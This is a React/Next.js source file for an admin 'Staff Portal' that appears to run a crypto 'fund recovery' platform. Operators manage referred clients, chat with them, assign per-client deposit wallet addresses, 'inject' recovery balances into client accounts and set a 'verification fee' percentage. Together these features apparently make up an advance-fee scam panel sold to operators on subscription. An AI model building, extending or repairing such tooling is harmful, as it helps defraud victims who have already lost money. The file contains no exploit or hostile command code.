"use client";
import React, { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation"; 
import { createClient } from "@supabase/supabase-js"; 
import { 
    Users, Search, Database, Save, Loader2, 
    Settings, Globe, Lock, Activity, MessageCircle, 
    Terminal, Wallet, Mail, Send, Bell, ShieldCheck, Trash2, Percent, X,
    Copy, Server, Link as LinkIcon, Check, Clock, AlertTriangle,
    Volume2, VolumeX, CheckCircle
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

import ClientTable from "./components/ClientTable";
import ClientManager from "./components/ClientManager";
import SupportChat from "./components/SupportChat";
import SystemConfig from "./components/SystemConfig";
import ClientActivities from "./components/ClientActivities"; 

const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!, 
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

// 🛠️ FIX 1: ADDED USDC TO THE LIST SO IT SAVES AND LOADS PROPERLY
const RECOVERY_COINS = ["BTC", "ETH", "USDT", "USDC", "SOL", "AVAX", "XRP", "BNB", "TRX", "SHIB"];

const getTimeLeft = (isoString?: string | null) => {
    if (!isoString) return { text: "Lifetime Access", color: "text-blue-400", warning: false };
    const diff = new Date(isoString).getTime() - new Date().getTime();
    if (diff <= 0) return { text: "Subscription Expired", color: "text-red-500", warning: true };
    
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    
    if (days > 0) return { text: `${days} Days, ${hours} Hrs Left`, color: days <= 3 ? "text-orange-500" : "text-green-500", warning: days <= 3 };
    return { text: `${hours} Hours Left`, color: "text-red-500", warning: true };
};

export default function StaffPortal({ adminId }: { adminId?: string }) {
    const router = useRouter();
    const [isAuthChecking, setIsAuthChecking] = useState(true);

    useEffect(() => {
        const verifyAccess = async () => {
            const { data: { session } } = await supabase.auth.getSession();
            if (!session) {
                router.push('/login');
                return;
            }

            const { data: profile } = await supabase
                .from('profiles')
                .select('role')
                .eq('id', session.user.id)
                .single();

            if (profile?.role !== 'admin' && profile?.role !== 'super_admin') {
                router.push('/login');
                return;
            }
            setIsAuthChecking(false);
        };
        verifyAccess();
    }, [router]);

    const [activeTab, setActiveTab] = useState<"clients" | "system" | "messages">("clients");
    const [clients, setClients] = useState<any[]>([]);
    const [loading, setLoading] = useState(true);
    const [search, setSearch] = useState("");
    
    const [selectedClient, setSelectedClient] = useState<any>(null);
    const [activityClient, setActivityClient] = useState<any>(null); 
    const [recoveryForm, setRecoveryForm] = useState<Record<string, string>>({});
    const [depositForm, setDepositForm] = useState({ btc: "", eth: "", usdt: "", usdc: "" }); // FIX 2: Added USDT/USDC state
    const [feeOverride, setFeeOverride] = useState<number>(7);
    const [saving, setSaving] = useState(false);

    const [conversations, setConversations] = useState<any[]>([]);
    const [activeConversation, setActiveConversation] = useState<string | null>(null);
    const [chatInput, setChatInput] = useState("");
    const [unreadTotal, setUnreadTotal] = useState(0);

    const [isMuted, setIsMuted] = useState(false);
    const isMutedRef = useRef(false);
    const [unreadActivities, setUnreadActivities] = useState<Record<string, number>>({});

    const [myReferralCode, setMyReferralCode] = useState<string>("Loading...");
    const [adminEmail, setAdminEmail] = useState<string>("Loading..."); 
    const [subscriptionEndsAt, setSubscriptionEndsAt] = useState<string | null>(null);
    const [copiedCode, setCopiedCode] = useState(false);
    const [copiedLink, setCopiedLink] = useState(false);

    const [isLocked, setIsLocked] = useState(false);
    const [lockReason, setLockReason] = useState("");

    const [toast, setToast] = useState<{ message: string, type: 'success' | 'error' } | null>(null);

    const showToast = (message: string, type: 'success' | 'error' = 'success') => {
        setToast({ message, type });
        setTimeout(() => setToast(null), 3000); 
    };

    useEffect(() => { isMutedRef.current = isMuted; }, [isMuted]);

    const [notification, setNotification] = useState<{show: boolean, title: string, text: string, senderId?: string, senderEmail?: string} | null>(null);

    const [adminSettings, setAdminSettings] = useState({
        btc_wallet_address: "", eth_wallet_address: "", usdt_wallet_address: "", sol_wallet_address: "", usdc_wallet_address: "", telegram_link: ""
    });

    const getActiveUserId = async () => {
        if (adminId) return adminId; 
        const { data: { user } } = await supabase.auth.getUser();
        return user?.id;
    };

    useEffect(() => {
        if (isAuthChecking) return;

        fetchMyServerIdentity();
        fetchMyClients();
        fetchAdminSettings();
        fetchMessages();

        let channel: any;
        const setupRealtime = async () => {
            const uid = await getActiveUserId();
            if (!uid) return;

            channel = supabase.channel(`admin-${uid}-realtime`)
                .on('postgres_changes', { event: '*', schema: 'public', table: 'profiles' }, (payload) => {
                    fetchMyClients();
                    if (payload.eventType === 'INSERT' && (payload.new.referred_by === uid || payload.new.managed_by === uid)) {
                        playNotificationSound(`New client registration: ${payload.new.email}`);
                        setNotification({ show: true, title: "New Client Joined!", text: payload.new.email, senderId: payload.new.id, senderEmail: payload.new.email });
                    }
                })
                .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'support_messages', filter: `receiver_id=eq.${uid}` }, async (payload) => {
                    let senderEmail = "Unknown Client";
                    const { data: profile } = await supabase.from('profiles').select('email').eq('id', payload.new.sender_id).single();
                    if (profile && profile.email) senderEmail = profile.email;

                    playNotificationSound(`New message from ${senderEmail}`);
                    setNotification({ show: true, title: "New Support Message", text: payload.new.message, senderId: payload.new.sender_id, senderEmail: senderEmail });
                    fetchMessages();
                })
                .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'transactions' }, async (payload) => {
                    const { data: clientCheck } = await supabase.from('profiles').select('email').eq('id', payload.new.user_id).eq('referred_by', uid).single();
                    if (clientCheck) {
                        const actionType = payload.new.type.replace('_', ' ').toUpperCase();
                        playNotificationSound(`New ${actionType} from ${clientCheck.email}`);
                        setNotification({ show: true, title: `Action: ${actionType}`, text: `${clientCheck.email} initiated a ${payload.new.amount} ${payload.new.asset} transfer.`, senderId: payload.new.user_id, senderEmail: clientCheck.email });
                        
                        setUnreadActivities(prev => ({ ...prev, [payload.new.user_id]: (prev[payload.new.user_id] || 0) + 1 }));
                        fetchMyClients(); 
                    }
                })
                .subscribe();
        };

        setupRealtime();
        return () => { if (channel) supabase.removeChannel(channel); };
    }, [adminId, isAuthChecking]);

    const playNotificationSound = (voiceMessage: string) => {
        if (!isMutedRef.current) {
            const audio = new Audio("https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3");
            audio.volume = 0.6;
            audio.play().catch(e => console.log("Audio block", e));

            if ('speechSynthesis' in window) {
                const utterance = new SpeechSynthesisUtterance(voiceMessage);
                utterance.rate = 1.0;
                utterance.pitch = 1.0;
                window.speechSynthesis.speak(utterance);
            }
        }
    };

    const handleNotificationClick = () => {
        if (!notification) return;
        if (notification.title === "New Support Message" && notification.senderId) {
            setActiveTab("messages");
            setActiveConversation(notification.senderId);
            markAsRead(notification.senderId);
        } else if (notification.senderId) {
            setActiveTab("clients");
            const client = clients.find(c => c.id === notification.senderId);
            if (client) handleOpenActivities(client);
        }
        setNotification(null);
    };

    const handleOpenActivities = (client: any) => {
        setActivityClient(client);
        setUnreadActivities(prev => ({ ...prev, [client.id]: 0 }));
    };

    const fetchMyServerIdentity = async () => {
        const uid = await getActiveUserId();
        if (uid) {
            const { data } = await supabase.from('profiles').select('*').eq('id', uid).single();
            if (data) {
                setMyReferralCode(data.referral_code || "UNASSIGNED");
                setAdminEmail(data.email || "Unknown Email");
                setSubscriptionEndsAt(data.subscription_ends_at);

                const isPaused = data.account_status === 'paused';
                const isExpired = data.subscription_ends_at && new Date(data.subscription_ends_at).getTime() <= Date.now();
                
                setIsLocked(isPaused || isExpired);
                if (isPaused) setLockReason("Account Paused by Super Admin");
                else if (isExpired) setLockReason("Subscription Expired");
            }
        }
    };

    const fetchMyClients = async () => {
        setLoading(true);
        const uid = await getActiveUserId();
        if (uid) {
            const { data, error } = await supabase.from('profiles').select('*').eq('referred_by', uid); 
            if (!error && data) setClients(data);
        }
        setLoading(false);
    };

    const fetchAdminSettings = async () => {
        const uid = await getActiveUserId();
        if (uid) {
            const { data } = await supabase.from('admin_settings').select('*').eq('admin_id', uid).single();
            if (data) setAdminSettings(data);
        }
    };

    const fetchMessages = async () => {
        const uid = await getActiveUserId();
        if (!uid) return;

        const { data: msgs } = await supabase
            .from('support_messages')
            .select(`*, sender:sender_id (full_name, email), receiver:receiver_id (full_name, email)`)
            .or(`sender_id.eq.${uid},receiver_id.eq.${uid}`)
            .order('created_at', { ascending: true });

        if (msgs) {
            const grouped: any = {};
            let unreadCount = 0;

            msgs.forEach((msg: any) => {
                const isMe = msg.sender_id === uid;
                const otherUserId = isMe ? msg.receiver_id : msg.sender_id;
                const otherUser = isMe ? msg.receiver : msg.sender;

                if (!grouped[otherUserId]) {
                    grouped[otherUserId] = {
                        userId: otherUserId, name: otherUser?.full_name || "Unknown User", email: otherUser?.email || "No Email",
                        messages: [], lastMessage: "", lastTime: "", subject: "General Inquiry", hasUnread: false
                    };
                }

                grouped[otherUserId].messages.push(msg);
                grouped[otherUserId].lastMessage = msg.message;
                grouped[otherUserId].lastTime = new Date(msg.created_at).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
                if(msg.subject) grouped[otherUserId].subject = msg.subject; 
                
                if (!isMe && !msg.is_read) {
                    grouped[otherUserId].hasUnread = true;
                    unreadCount++;
                }
            });

            const convArray = Object.values(grouped).sort((a: any, b: any) => 
                new Date(b.messages[b.messages.length-1].created_at).getTime() - new Date(a.messages[a.messages.length-1].created_at).getTime()
            );

            setConversations(convArray);
            setUnreadTotal(unreadCount);
        }
    };

    const sendMessage = async () => {
        if (!chatInput.trim() || !activeConversation) return;
        const uid = await getActiveUserId();
        if (!uid) return;

        const msg = chatInput;
        setChatInput(""); 

        await supabase.from('support_messages').insert({ sender_id: uid, receiver_id: activeConversation, message: msg, is_read: false });
        fetchMessages(); 
    };

    const deleteChat = async () => {
        if (!activeConversation) return;
        const confirmDelete = window.confirm("Are you sure you want to delete this conversation? This cannot be undone.");
        if (!confirmDelete) return;

        const { error } = await supabase.rpc('delete_conversation', { target_user_id: activeConversation });
        if (!error) {
            setConversations(prev => prev.filter(c => c.userId !== activeConversation));
            setActiveConversation(null);
            showToast("Conversation wiped.", "success");
        } else {
            showToast("Error wiping conversation.", "error");
        }
    };

    const markAsRead = async (senderId: string) => {
        const uid = await getActiveUserId();
        if(!uid) return;
        setConversations(prev => prev.map(c => c.userId === senderId ? { ...c, hasUnread: false } : c));
        setUnreadTotal(prev => Math.max(0, prev - 1));
        await supabase.from('support_messages').update({ is_read: true }).eq('sender_id', senderId).eq('receiver_id', uid);
    };

    const saveSystemSettings = async () => {
        setSaving(true);
        const uid = await getActiveUserId();
        if (uid) {
            const { error } = await supabase.from('admin_settings').upsert({ admin_id: uid, ...adminSettings });
            if (!error) showToast("Config Saved.", "success");
            else showToast("Error saving configs.", "error");
        }
        setSaving(false);
    };

    const handleKycUpdate = async (status: string) => {
        if (!selectedClient) return;
        await supabase.from('profiles').update({ kyc_status: status }).eq('id', selectedClient.id);
        showToast(`KYC updated to ${status.toUpperCase()}`, "success");
        setSelectedClient(null); 
        fetchMyClients(); 
    };

    const openManager = async (client: any) => {
        setSelectedClient(client);
        setSaving(true);
        const { data } = await supabase.from('recovery_allocations').select('*').eq('user_id', client.id);
        const rForm: any = {};
        RECOVERY_COINS.forEach(c => rForm[c] = "0");
        if (data) data.forEach((item: any) => { if (RECOVERY_COINS.includes(item.symbol)) rForm[item.symbol] = item.amount; });
        setRecoveryForm(rForm);

        // 🛠️ FIX 3: ADDED USDT AND USDC TO THE DEPOSIT FORM STATE
        setDepositForm({ 
            btc: client.specific_btc_address || "", 
            eth: client.specific_eth_address || "",
            usdt: client.specific_usdt_address || "",
            usdc: client.specific_usdc_address || ""
        });
        
        setFeeOverride(client.verification_fee_percent !== null && client.verification_fee_percent !== undefined ? Number(client.verification_fee_percent) : 7);
        setSaving(false);
    };

    const saveRecoveryInjection = async () => {
        if (!selectedClient) return;
        setSaving(true);
        const items = Object.entries(recoveryForm).filter(([_, amount]) => parseFloat(amount as string) > 0).map(([symbol, amount]) => ({ symbol, amount }));
        const { error } = await supabase.rpc('admin_inject_recovery', { target_user_id: selectedClient.id, asset_data: items });
        if (!error) showToast("Recovery Injected!", "success");
        else showToast("Error injecting.", "error");
        setSaving(false);
    };

    const saveDepositOverrides = async () => {
        if (!selectedClient) return;
        setSaving(true);
        
        // 🛠️ FIX 4: ENSURED USDT AND USDC ARE SAVED TO SUPABASE
        const { error } = await supabase.from('profiles').update({ 
            specific_btc_address: depositForm.btc || null, 
            specific_eth_address: depositForm.eth || null,
            specific_usdt_address: depositForm.usdt || null,
            specific_usdc_address: depositForm.usdc || null
        }).eq('id', selectedClient.id);

        if (!error) { showToast("Addresses Linked.", "success"); fetchMyClients(); }
        else showToast("Error linking.", "error");
        setSaving(false);
    };

    const saveFeeOverride = async () => {
        if (!selectedClient) return;
        setSaving(true);
        const { error } = await supabase.from('profiles').update({ verification_fee_percent: feeOverride }).eq('id', selectedClient.id);
        if (!error) { showToast(`Fee set to ${feeOverride}%.`, "success"); fetchMyClients(); }
        else showToast("Error setting fee.", "error");
        setSaving(false);
    };

    const filteredClients = clients.filter(c => 
        (c.email || "").toLowerCase().includes(search.toLowerCase()) || (c.full_name || "").toLowerCase().includes(search.toLowerCase())
    );

    const timerStatus = getTimeLeft(subscriptionEndsAt);
    const activeChatData = conversations.find(c => c.userId === activeConversation);

    if (isAuthChecking) {
        return (
            <div className="min-h-screen bg-[#020202] flex flex-col items-center justify-center gap-4 text-blue-500 text-xs font-bold uppercase tracking-widest">
                <Loader2 size={24} className="animate-spin" />
                Establishing Secure Connection...
            </div>
        );
    }

    return (
        <div className="h-[100dvh] w-full bg-[#020202] text-white font-sans selection:bg-purple-500/30 overflow-hidden flex flex-col md:flex-row overscroll-none">
            
            <AnimatePresence>
                {toast && (
                    <motion.div 
                        initial={{ opacity: 0, y: -50, x: "-50%" }} 
                        animate={{ opacity: 1, y: 0, x: "-50%" }} 
                        exit={{ opacity: 0, y: -20, x: "-50%" }}
                        transition={{ type: "spring", stiffness: 300, damping: 25 }}
                        className={`fixed top-4 md:top-6 left-1/2 z-[9999] px-4 md:px-6 py-2.5 md:py-3 rounded-full flex items-center gap-2 md:gap-3 shadow-2xl backdrop-blur-md whitespace-nowrap ${
                            toast.type === 'success' ? 'bg-green-500/20 border border-green-500/30 text-green-400' : 'bg-red-500/20 border border-red-500/30 text-red-400'
                        }`}
                    >
                        {toast.type === 'success' ? <CheckCircle size={16} /> : <AlertTriangle size={16} />}
                        <span className="text-xs md:text-sm font-bold tracking-wide">{toast.message}</span>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* SIDEBAR */}
            <div className="w-full md:w-72 flex-shrink-0 p-4 md:p-6 flex flex-col gap-4 overflow-y-auto border-b md:border-b-0 md:border-r border-white/5 custom-scrollbar">
                
                <div className="bg-[#0a0a0c] border border-white/5 rounded-2xl p-4 md:p-6 relative overflow-hidden flex-shrink-0">
                    <div className="absolute top-0 right-0 p-10 bg-purple-600/20 blur-[60px] rounded-full"></div>
                    <div className="flex items-center gap-3 mb-4 md:mb-8 relative z-10">
                        <div className="w-10 h-10 md:w-12 md:h-12 rounded-xl bg-gradient-to-br from-purple-600 to-indigo-600 flex items-center justify-center shadow-lg shadow-purple-900/30 border border-white/10 shrink-0">
                            <Terminal size={20} className="text-white" />
                        </div>
                        <div className="overflow-hidden">
                            {/* FIX: CHANGED ADMIN CONSOLE TO ADMIN PANEL */}
                            <h1 className="font-bold text-white tracking-tight text-sm md:text-base truncate">{adminId ? 'Impersonation Mode' : 'Admin Panel'}</h1>
                            <div className="text-[10px] text-purple-400 font-mono mt-0.5 truncate">{adminEmail}</div>
                            
                            <div className="flex items-center gap-2 mt-1 flex-wrap">
                                <p className="text-[9px] md:text-[10px] text-gray-500 font-mono flex items-center gap-1">
                                    <span className={`w-1.5 h-1.5 md:w-2 md:h-2 rounded-full animate-pulse ${isLocked ? 'bg-red-500' : 'bg-green-500'}`}></span> {isLocked ? 'LOCKED' : 'SECURE'}
                                </p>
                                
                                <button 
                                    onClick={() => setIsMuted(!isMuted)}
                                    className={`text-[8px] md:text-[9px] font-bold px-1.5 py-0.5 rounded flex items-center gap-1 transition cursor-pointer ${isMuted ? 'bg-red-500/20 text-red-500' : 'bg-green-500/20 text-green-500'}`}
                                    title="Toggle Voice Alerts"
                                >
                                    {isMuted ? <VolumeX size={10} /> : <Volume2 size={10} />}
                                    {isMuted ? 'MUTED' : 'VOICE ON'}
                                </button>
                            </div>
                        </div>
                    </div>
                    
                    <nav className="flex flex-row md:flex-col gap-2 overflow-x-auto md:overflow-visible pb-1 md:pb-0 scrollbar-hide relative z-10">
                        <button onClick={() => setActiveTab("clients")} className={`shrink-0 text-left px-3 py-2 md:px-4 md:py-3 rounded-xl text-[10px] md:text-xs font-bold uppercase tracking-wider flex items-center gap-2 md:gap-3 transition ${activeTab === "clients" ? "bg-white text-black shadow-lg" : "text-gray-400 bg-white/5 lg:bg-transparent lg:hover:bg-white/5"}`}>
                            <Users size={16} className="md:w-4 md:h-4 w-3 h-3" /> <span className="whitespace-nowrap">My Clients</span>
                        </button>
                        <button onClick={() => setActiveTab("messages")} className={`shrink-0 text-left px-3 py-2 md:px-4 md:py-3 rounded-xl text-[10px] md:text-xs font-bold uppercase tracking-wider flex items-center justify-between gap-3 md:gap-0 transition ${activeTab === "messages" ? "bg-white text-black shadow-lg" : "text-gray-400 bg-white/5 lg:bg-transparent lg:hover:bg-white/5"}`}>
                            <div className="flex items-center gap-2 md:gap-3"><Mail size={16} className="md:w-4 md:h-4 w-3 h-3" /> <span className="whitespace-nowrap">Help Desk</span></div>
                            {unreadTotal > 0 && <span className="bg-red-500 text-white text-[9px] md:text-[10px] px-1.5 md:px-2 py-0.5 rounded-full">{unreadTotal}</span>}
                        </button>
                        <button onClick={() => setActiveTab("system")} className={`shrink-0 text-left px-3 py-2 md:px-4 md:py-3 rounded-xl text-[10px] md:text-xs font-bold uppercase tracking-wider flex items-center gap-2 md:gap-3 transition ${activeTab === "system" ? "bg-white text-black shadow-lg" : "text-gray-400 bg-white/5 lg:bg-transparent lg:hover:bg-white/5"}`}>
                            <Settings size={16} className="md:w-4 md:h-4 w-3 h-3" /> <span className="whitespace-nowrap">Global Config</span>
                        </button>
                    </nav>
                </div>

                <div className="bg-[#0f0f12] border border-white/10 rounded-xl p-3 md:p-4 relative overflow-hidden group flex-shrink-0 hidden sm:block">
                    <div className="absolute top-0 right-0 p-8 bg-blue-600/10 blur-[40px] rounded-full group-hover:bg-blue-600/20 transition duration-500"></div>
                    <h4 className="text-[9px] md:text-[10px] uppercase font-bold text-gray-500 tracking-widest mb-2 md:mb-3 flex items-center justify-between gap-2">
                        <div className="flex items-center gap-1.5 md:gap-2"><Server size={12} className="text-blue-500" /> Server Identity</div>
                    </h4>
                    
                    <div className={`border rounded-lg p-2.5 md:p-3 mb-2 md:mb-3 flex items-center gap-2 md:gap-3 ${timerStatus.warning ? 'bg-red-500/10 border-red-500/20' : 'bg-green-500/10 border-green-500/20'}`}>
                        <div className={`p-1.5 md:p-2 rounded-full ${timerStatus.warning ? 'bg-red-500/20 text-red-500' : 'bg-green-500/20 text-green-500'}`}>
                            {timerStatus.warning ? <AlertTriangle size={14} /> : <Clock size={14} />}
                        </div>
                        <div>
                            <div className="text-[9px] md:text-[10px] text-gray-400 uppercase tracking-widest">Subscription</div>
                            <div className={`font-mono text-xs md:text-sm font-bold ${timerStatus.color}`}>{timerStatus.text}</div>
                        </div>
                    </div>

                    <div className="bg-black/50 border border-white/5 rounded-lg p-2.5 md:p-3 mb-2 md:mb-3">
                        <div className="text-[9px] md:text-[10px] text-gray-400 mb-1">SERVER NUMBER (ID)</div>
                        <div className="text-sm md:text-xl font-mono font-bold text-white tracking-wider flex justify-between items-center">
                            {myReferralCode}
                            <button className="text-gray-600 hover:text-white cursor-pointer transition p-1" onClick={() => { navigator.clipboard.writeText(myReferralCode); setCopiedCode(true); setTimeout(() => setCopiedCode(false), 2000); }}>
                                {copiedCode ? <Check size={14} className="text-green-500" /> : <Copy size={14} />}
                            </button>
                        </div>
                    </div>

                    <div className="bg-black/50 border border-white/5 rounded-lg p-2.5 md:p-3">
                        <div className="text-[9px] md:text-[10px] text-gray-400 mb-1">DIRECT INVITE LINK</div>
                        <div className="flex items-center gap-2">
                            <code className="text-[9px] md:text-[10px] text-blue-400 bg-blue-500/10 px-1.5 md:px-2 py-1 rounded truncate flex-1 font-mono">refunda.online/{myReferralCode}</code>
                            <button onClick={() => { navigator.clipboard.writeText(`https://refunda.online/${myReferralCode}`); setCopiedLink(true); setTimeout(() => setCopiedLink(false), 2000); }} className="p-1 md:p-1.5 bg-blue-600 text-white rounded hover:bg-blue-500 transition">
                                {copiedLink ? <Check size={12} /> : <LinkIcon size={12} />}
                            </button>
                        </div>
                    </div>
                </div>
            </div>

            {/* MAIN CONTENT */}
            <div className="flex-1 bg-[#0a0a0c] md:border-l border-white/5 overflow-hidden relative flex flex-col h-full">
                
                {isLocked && (
                    <div className="bg-red-500 text-white font-bold text-center py-2 md:py-3 px-4 text-[9px] md:text-sm flex items-center justify-center gap-1.5 md:gap-2 uppercase tracking-widest shadow-[0_4px_20px_rgba(239,68,68,0.3)] z-50 relative shrink-0">
                        <Lock size={14} className="md:w-4 md:h-4" /> READ-ONLY MODE: {lockReason}. Management actions are disabled.
                    </div>
                )}

                <div className="flex-1 overflow-y-auto custom-scrollbar p-0 md:p-6">
                    {activeTab === "clients" && (
                        <ClientTable 
                            search={search} 
                            setSearch={setSearch} 
                            loading={loading} 
                            filteredClients={filteredClients} 
                            openManager={openManager} 
                            openActivities={handleOpenActivities} 
                            unreadActivities={unreadActivities} 
                        />
                    )}

                    {activeTab === "messages" && (
                        <SupportChat 
                            conversations={conversations} 
                            activeConversation={activeConversation} 
                            setActiveConversation={setActiveConversation} 
                            chatInput={chatInput} 
                            setChatInput={setChatInput} 
                            sendMessage={sendMessage} 
                            deleteChat={deleteChat} 
                            markAsRead={markAsRead} 
                            activeChatData={activeChatData} 
                            isMuted={isMuted} 
                            setIsMuted={setIsMuted} 
                            isLocked={isLocked}
                        />
                    )}

                    {activeTab === "system" && (
                        <SystemConfig 
                            adminSettings={adminSettings} 
                            setAdminSettings={setAdminSettings} 
                            saveSystemSettings={saveSystemSettings} 
                            saving={saving} 
                            isLocked={isLocked}
                        />
                    )}
                </div>
            </div>

            <ClientManager 
                selectedClient={selectedClient} setSelectedClient={setSelectedClient} handleKycUpdate={handleKycUpdate}
                recoveryForm={recoveryForm} setRecoveryForm={setRecoveryForm} saveRecoveryInjection={saveRecoveryInjection}
                depositForm={depositForm} setDepositForm={setDepositForm} saveDepositOverrides={saveDepositOverrides}
                feeOverride={feeOverride} setFeeOverride={setFeeOverride} saveFeeOverride={saveFeeOverride} saving={saving}
                isLocked={isLocked}
            />

            <ClientActivities 
                client={activityClient} 
                onClose={() => setActivityClient(null)} 
                refreshData={fetchMyClients} 
                isLocked={isLocked} 
            />

            <AnimatePresence>
                {notification && (
                    <motion.div 
                        initial={{ opacity: 0, y: 50, scale: 0.9 }} animate={{ opacity: 1, y: 0, scale: 1 }} exit={{ opacity: 0, y: 20, scale: 0.9 }}
                        onClick={handleNotificationClick}
                        className="fixed bottom-4 right-4 md:bottom-5 md:right-5 w-[calc(100vw-32px)] md:w-96 max-w-[90vw] bg-[#1a1a1d] border border-blue-500 rounded-xl p-4 md:p-5 cursor-pointer shadow-[0_0_30px_rgba(59,130,246,0.2)] z-[9999] flex items-center gap-3 md:gap-4 hover:bg-[#222] transition border-l-4 border-l-blue-500"
                    >
                        <div className="w-10 h-10 md:w-12 md:h-12 rounded-full bg-blue-600/20 border border-blue-500/30 flex items-center justify-center flex-shrink-0 animate-pulse">
                            <Bell size={20} className="text-blue-400 md:w-6 md:h-6" />
                        </div>
                        <div className="flex-1 overflow-hidden">
                            <div className="text-[10px] md:text-xs font-bold text-blue-400 mb-0.5 tracking-wider uppercase">{notification.title}</div>
                            <div className="font-bold text-white text-xs md:text-sm mb-1 truncate">{notification.senderEmail}</div>
                            <div className="text-[10px] md:text-[11px] text-gray-400 truncate">{notification.text}</div>
                        </div>
                        <div className="flex-shrink-0">
                            <div className="w-6 h-6 md:w-8 h-8 rounded-full bg-white/5 flex items-center justify-center hover:bg-white/10">
                                <MessageCircle size={14} className="text-white md:w-4 md:h-4"/>
                            </div>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    );
}